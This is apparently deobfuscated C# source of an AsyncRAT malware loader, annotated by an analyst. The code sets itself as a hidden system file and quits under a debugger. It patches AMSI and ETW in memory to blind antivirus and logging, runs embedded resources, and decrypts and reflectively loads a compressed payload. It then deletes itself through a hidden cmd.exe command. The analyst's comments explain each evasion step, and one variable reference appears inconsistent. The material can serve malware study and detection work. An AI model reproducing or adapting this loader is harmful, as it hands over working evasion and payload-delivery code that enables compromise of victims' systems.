// Deobfuscated with ❤️ from Malware Guy - do not run on your system!
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace AsyncRAT
{
	internal class InternalModule
	{
		[DllImport("kernel32.dll")]
		private static extern IntPtr LoadLibrary(string lpFileName);

		[DllImport("kernel32.dll")]
		private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

		private static void Main(string[] args)
		{
			// Get filename of the running process and set the file attributes of the process image to become a hidden "system" file
			string fileName = Process.GetCurrentProcess().MainModule.FileName;
			File.SetAttributes(fileName, FileAttributes.Hidden | FileAttributes.System);

			// Dynamic import resolution - grab CheckRemoteDebuggerPresent and IsDebuggerPresent for anti-debugging purposes
			IntPtr intPtr = InternalModule.LoadLibrary("kernel32.dll");
			IntPtr pCheckRemoteDebuggerPresent = InternalModule.GetProcAddress(intPtr, Encoding.UTF8.GetString(InternalModule.AESDecrypt(Convert.FromBase64String("AFafqwnkfWEjTfHvWgpA31JSw48jCYoOO5Hpwb7XMwU="), Convert.FromBase64String("xPKz68ckVaoXl0vXrFZSgHH76+BI0mND2C3fdMg77pU="), Convert.FromBase64String("r8anBtSFDxtMZ6sKz4wvXg=="))));
			IntPtr pIsDebuggerPresent = InternalModule.GetProcAddress(intPtr, Encoding.UTF8.GetString(InternalModule.AESDecrypt(Convert.FromBase64String("3DwCFuhpnmcteIDp1craMVf6+1Tajed1IuPUGzq0VD8="), Convert.FromBase64String("xPKz68ckVaoXl0vXrFZSgHH76+BI0mND2C3fdMg77pU="), Convert.FromBase64String("r8anBtSFDxtMZ6sKz4wvXg=="))));
			InternalModule.CheckRemoteDebuggerPresent CheckRemoteDebuggerPresent = (InternalModule.CheckRemoteDebuggerPresent)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(InternalModule.CheckRemoteDebuggerPresent));
			InternalModule.IsDebuggerPresent IsDebuggerPresent = (InternalModule.IsDebuggerPresent)Marshal.GetDelegateForFunctionPointer(pIsDebuggerPresent, typeof(InternalModule.IsDebuggerPresent));
			bool flag = false;
			CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref flag);
			if (Debugger.IsAttached || flag || IsDebuggerPresent())
			{
				Environment.Exit(1);
			}
			IntPtr pVirtualProtect = InternalModule.GetProcAddress(intPtr, "VirtualProtect");
			InternalModule.VirtualProtect VirtualProtect = (InternalModule.VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(InternalModule.VirtualProtect));
			
			// Load amsi.dll into memory and patch AMSI - check here: https://rastamouse.me/memory-patching-amsi-bypass/
			IntPtr pAmsiDll = InternalModule.LoadLibrary("amsi.dll");
			IntPtr AmsiScanBuffer = InternalModule.GetProcAddress(pAmsiDll, Encoding.UTF8.GetString(InternalModule.AESDecrypt(Convert.FromBase64String("xDA2RqlT3KRjv+ni0PrVrw=="), Convert.FromBase64String("xPKz68ckVaoXl0vXrFZSgHH76+BI0mND2C3fdMg77pU="), Convert.FromBase64String("r8anBtSFDxtMZ6sKz4wvXg=="))));
			byte[] array;
			if (IntPtr.Size == 8)
			{
				array = new byte[] { 184, 87, 0, 7, 128, 195 };
			}
			else
			{
				array = new byte[] { 184, 87, 0, 7, 128, 194, 24, 0 };
			}
			uint num;
			VirtualProtect(AmsiScanBuffer, (UIntPtr)((ulong)((long)array.Length)), 64U, out num);
			Marshal.Copy(array, 0, AmsiScanBuffer, array.Length);
			VirtualProtect(AmsiScanBuffer, (UIntPtr)((ulong)((long)array.Length)), num, out num);

			// Load ntdll.dll into memory and patch ETW - https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/
			IntPtr NtDll = InternalModule.LoadLibrary("ntdll.dll");
			IntPtr EtwEventWrite = InternalModule.GetProcAddress(NtDll, Encoding.UTF8.GetString(InternalModule.AESDecrypt(Convert.FromBase64String("BZLV16JrYWq9KFrc1OOKFw=="), Convert.FromBase64String("xPKz68ckVaoXl0vXrFZSgHH76+BI0mND2C3fdMg77pU="), Convert.FromBase64String("r8anBtSFDxtMZ6sKz4wvXg=="))));
			if (IntPtr.Size == 8)
			{
				array = new byte[] { 195 };
			}
			else
			{
				byte[] array2 = new byte[3];
				array2[0] = 194;
				array2[1] = 20;
				array = array2;
			}
			VirtualProtect(EtwEventWrite, (UIntPtr)((ulong)((long)array.Length)), 64U, out num);
			Marshal.Copy(array, 0, EtwEventWrite, array.Length);
			VirtualProtect(EtwEventWrite, (UIntPtr)((ulong)((long)array.Length)), num, out num);

			// Execute any resource items that aren't payload.exe or runpe.dll
			string PayloadExe = Encoding.UTF8.GetString(InternalModule.AESDecrypt(Convert.FromBase64String("oenGJtKlofTUzur3fvfG+Q=="), Convert.FromBase64String("xPKz68ckVaoXl0vXrFZSgHH76+BI0mND2C3fdMg77pU="), Convert.FromBase64String("r8anBtSFDxtMZ6sKz4wvXg==")));
			string RunPEDll = Encoding.UTF8.GetString(InternalModule.AESDecrypt(Convert.FromBase64String("Gg1TEnt38bh2/c89MrcMXA=="), Convert.FromBase64String("xPKz68ckVaoXl0vXrFZSgHH76+BI0mND2C3fdMg77pU="), Convert.FromBase64String("r8anBtSFDxtMZ6sKz4wvXg==")));
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
			for (int i = 0; i < manifestResourceNames.Length; i++)
			{
				string name = manifestResourceNames[i];
				if (!(name == PayloadExe) && !(name == RunPEDll))
				{
					File.WriteAllBytes(name, InternalModule.ObtainPayloadFromResources(name));
					File.SetAttributes(name, FileAttributes.Hidden | FileAttributes.System);
					new Thread(delegate
					{
						Process.Start(name).WaitForExit();
						File.SetAttributes(name, FileAttributes.Normal);
						File.Delete(name);
					}).Start();
				}
			}

			// Retrieve the next stager and load its assembly into memory
			byte[] DecompressedPayload = InternalModule.DecompressPayload(InternalModule.AESDecrypt(InternalModule.ObtainPayloadFromResources(PayloadExe), Convert.FromBase64String("xPKz68ckVaoXl0vXrFZSgHH76+BI0mND2C3fdMg77pU="), Convert.FromBase64String("r8anBtSFDxtMZ6sKz4wvXg==")));
			string[] array4 = new string[0];
			try
			{
				array4 = args[0].Split(new char[] { ' ' });
			}
			catch
			{
			}
			MethodInfo entryPoint = Assembly.Load(DecompressedPayload).EntryPoint;
			try
			{
				entryPoint.Invoke(null, new object[] { array4 });
			}
			catch
			{
				entryPoint.Invoke(null, null);
			}

			/* Bypass confirmations and set the file attributes for the current process image to system and hidden, before deleting it
            Resultant command - cmd.exe /c choice /c y /n /d y /t 1 & attrib -h -s "filename.exe" & del "filename.exe" */
			string CmdArguments = Encoding.UTF8.GetString(InternalModule.AESDecrypt(Convert.FromBase64String("JXxvD1nIo+sJk16gODESWBwRUfh2EwAKJz7LKPB38eahvXTOVv9eMJbHZvo5MfoG"), Convert.FromBase64String("xPKz68ckVaoXl0vXrFZSgHH76+BI0mND2C3fdMg77pU="), Convert.FromBase64String("r8anBtSFDxtMZ6sKz4wvXg==")));
            Process.Start(new ProcessStartInfo
			{
				Arguments = string.Concat(new string[] { CmdArguments, fileName, "\" & del \"", fileName, "\"" }),
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
		}

		// Self-explanatory - decrypt any data passed through this function!
		private static byte[] AESDecrypt(byte[] input, byte[] key, byte[] iv)
		{
			AesManaged aesManaged = new AesManaged();
			aesManaged.Mode = CipherMode.CBC;
			aesManaged.Padding = PaddingMode.PKCS7;
			ICryptoTransform cryptoTransform = aesManaged.CreateDecryptor(key, iv);
			byte[] array = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			cryptoTransform.Dispose();
			aesManaged.Dispose();
			return array;
		}

		// Gzip is used to compress data, particularly helpful for reducing the size of payloads and making them obscure from antimalware solutions
		private static byte[] DecompressPayload(byte[] bytes)
		{
			MemoryStream memoryStream = new MemoryStream(bytes);
			MemoryStream memoryStream2 = new MemoryStream();
			GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
			gzipStream.CopyTo(memoryStream2);
			gzipStream.Dispose();
			memoryStream2.Dispose();
			memoryStream.Dispose();
			return memoryStream2.ToArray();
		}

		// Retrieve the payload from the resources section of the .NET binary
		private static byte[] ObtainPayloadFromResources(string name)
		{
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			MemoryStream memoryStream = new MemoryStream();
			Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
			manifestResourceStream.CopyTo(memoryStream);
			manifestResourceStream.Dispose();
			byte[] array = memoryStream.ToArray();
			memoryStream.Dispose();
			return array;
		}

		private delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
		private delegate bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
		private delegate bool IsDebuggerPresent();
	}
}
